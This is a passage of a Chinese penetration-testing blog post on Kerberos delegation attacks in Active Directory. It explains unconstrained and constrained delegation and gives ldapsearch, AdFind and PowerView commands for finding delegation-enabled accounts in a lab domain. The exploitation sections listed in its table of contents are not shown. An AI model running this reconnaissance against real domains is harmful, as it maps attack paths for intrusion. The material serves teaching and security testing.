<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>域渗透——Kerberos委派攻击 | 七友</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="pentest">
    <meta name="description" content="前置知识域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动 委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委">
<meta name="keywords" content="pentest">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透——Kerberos委派攻击">
<meta property="og:url" content="https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/index.html">
<meta property="og:site_name" content="七友">
<meta property="og:description" content="前置知识域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动 委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211220455-7afcc3f0-4cd7-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206162116-a4dd0f4e-48b9-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206162614-56b431d4-48ba-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206165316-1da1e568-48be-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206163923-2d25d118-48bc-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211171505-fdc6fd1a-4cae-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211171701-43418342-4caf-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200205215906-acc0ea0e-481f-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200205220057-ee88c01a-481f-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200205220213-1bd856d4-4820-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206165805-c9d9c512-48be-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206164433-e5901240-48bc-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211172106-d50ce7da-4caf-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211172239-0c56c080-4cb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206170357-9bafde5a-48bf-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200205223329-7a841d9a-4824-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200206130430-2805d11a-489e-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200229223822-22b87436-5b01-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211111033-1160a96c-4c7c-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211110803-b7eafc16-4c7b-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211112007-67121a34-4c7d-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211111640-eb9fe46c-4c7c-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211112457-14599c12-4c7e-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211112640-514590cc-4c7e-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200210232526-900988fa-4c19-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211000739-75ec4826-4c1f-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200210231239-c749c250-4c17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211001236-272ec7d0-4c20-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200210222255-d446d31e-4c10-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200210220650-94f45f80-4c0e-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211002536-f7dcc0c0-4c21-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211002107-57633dd6-4c21-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211004433-9d945bd4-4c24-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211004601-d257f3e4-4c24-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200207103902-002e844c-4953-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208162356-59615fcc-4a4c-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208132812-cce6165e-4a33-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208133328-88ef2eb2-4a34-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208135043-f1a80198-4a36-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208165346-847a63c6-4a50-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208165529-c1e160f2-4a50-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208171625-ae0701f6-4a53-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208172530-f34096f0-4a54-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208172423-cae97370-4a54-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211165154-c0c23590-4cab-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211165502-30b415da-4cac-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211165823-a87b2da6-4cac-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211170205-2cc5d624-4cad-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208201546-bc68548e-4a6c-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208201626-d4453568-4a6c-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208211804-70145b4c-4a75-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208212218-07ca043c-4a76-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208212405-47a4808c-4a76-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208212458-6714dfb6-4a76-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200208212926-06b9b3f2-4a77-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211095642-c04916c2-4c71-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211100913-7fa14af2-4c73-1.png">
<meta property="og:updated_time" content="2020-02-29T15:43:17.456Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="域渗透——Kerberos委派攻击">
<meta name="twitter:description" content="前置知识域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动 委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200211220455-7afcc3f0-4cd7-1.png">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:hack2fun@foxmail.com" title="hack2fun@foxmail.com" class="mail">hack2fun@foxmail.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/byqiyou" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/friends"  >
                <i class="icon icon-lg icon-friends"></i>
                Friends
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-about"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">域渗透——Kerberos委派攻击</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">域渗透——Kerberos委派攻击</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-02-11T14:08:01.000Z" itemprop="datePublished" class="page-time">
  2020-02-11
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前置知识"><span class="post-toc-number">1.</span> <span class="post-toc-text">前置知识</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#发现域中委派的用户和计算机"><span class="post-toc-number">2.</span> <span class="post-toc-text">发现域中委派的用户和计算机</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理说明"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">原理说明</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#非约束委派的查找"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">非约束委派的查找</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ldapsearch"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">ldapsearch</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ADFind"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">ADFind</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PowerView"><span class="post-toc-number">2.2.3.</span> <span class="post-toc-text">PowerView</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#约束委派"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">约束委派</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ldapsearch-1"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">ldapsearch</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ADFind-1"><span class="post-toc-number">2.3.2.</span> <span class="post-toc-text">ADFind</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PowerView-1"><span class="post-toc-number">2.3.3.</span> <span class="post-toc-text">PowerView</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#非约束委派的利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">非约束委派的利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#概述"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">概述</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#操作"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#非约束委派-Spooler打印机服务"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">非约束委派+Spooler打印机服务</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#约束委派的利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">约束委派的利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#概述-1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">概述</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#操作-1"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用约束委派生成黄金票据"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">利用约束委派生成黄金票据</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御"><span class="post-toc-number">5.</span> <span class="post-toc-text">防御</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">6.</span> <span class="post-toc-text">Reference</span></a></li></ol>
        </nav>
    </aside>


<article id="post-域渗透——Kerberos委派攻击"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">域渗透——Kerberos委派攻击</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-02-11 22:08:01" datetime="2020-02-11T14:08:01.000Z"  itemprop="datePublished">2020-02-11</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
<p>委派主要分为非约束委派<code>(Unconstrained delegation)</code>和约束委派<code>(Constrained delegation)</code>两个方式，还有一种是基于资源的约束委派（<code>Resource Based Constrained Delegation</code>）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委派这两种方法的利用</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211220455-7afcc3f0-4cd7-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<h2 id="发现域中委派的用户和计算机"><a href="#发现域中委派的用户和计算机" class="headerlink" title="发现域中委派的用户和计算机"></a>发现域中委派的用户和计算机</h2><h3 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h3><ul>
<li>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></li>
<li>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</li>
</ul>
<p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206162116-a4dd0f4e-48b9-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206162614-56b431d4-48ba-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>下面介绍三种比较常见方法用于查找域中委派的用户和计算机</p>
<h3 id="非约束委派的查找"><a href="#非约束委派的查找" class="headerlink" title="非约束委派的查找"></a>非约束委派的查找</h3><h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><blockquote>
<p>kali上自带，适合在域外查询</p>
</blockquote>
<p>这个参数过多就不一一列举了，需要查阅的<code>ldapsearch -h</code>即可</p>
<p>查找域中配置非约束委派的用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.141.145:389 -D &quot;CN=qiyou,CN=Users,DC=qiyou,DC=com&quot; -w password -b &quot;DC=qiyou,DC=com&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure></p>
<p>过滤条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206165316-1da1e568-48be-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.141.145:389 -D &quot;CN=qiyou,CN=Users,DC=qiyou,DC=com&quot; -w password -b &quot;DC=qiyou,DC=com&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：域控主机账户默认开启非约束委派</p>
<p>过滤条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure></p>
<p><strong>注</strong>：更多LDAP的过滤语法请参考微软的手册：<a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful" target="_blank" rel="noopener">地址</a></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206163923-2d25d118-48bc-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注</strong>：区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p>
<h4 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h4><p>使用参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br></pre></td></tr></table></figure></p>
<p>参数说明：</p>
<ul>
<li>-b：指定要查询的根节点</li>
<li>-f：LDAP过滤条件</li>
<li>attr list：需要显示的属性</li>
</ul>
<p>查找域中配置非约束委派的用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=qiyou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211171505-fdc6fd1a-4cae-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=qiyou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211171701-43418342-4caf-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>查找域中配置非约束委派用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain qiyou.com |select name</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205215906-acc0ea0e-481f-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置非约束委派的主机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained -Domain qiyou.com</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205220057-ee88c01a-481f-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查询域中配置非约束委派的主机（另外一个版本的powerview）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose | ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205220213-1bd856d4-4820-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><h4 id="ldapsearch-1"><a href="#ldapsearch-1" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><p>查找域中配置约束委派用户</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure>
<p>过滤条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206165805-c9d9c512-48be-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure>
<p>过滤条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206164433-e5901240-48bc-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<h4 id="ADFind-1"><a href="#ADFind-1" class="headerlink" title="ADFind"></a>ADFind</h4><p>查找域中配置约束委派用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=qiyou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211172106-d50ce7da-4caf-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=qiyou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211172239-0c56c080-4cb0-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<h4 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h4><p><strong>注</strong>：Powerview有两个版本，一个在dev分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a>，一个在master分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a></p>
<p>查找域中配置约束委派用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206170357-9bafde5a-48bf-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205223329-7a841d9a-4824-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
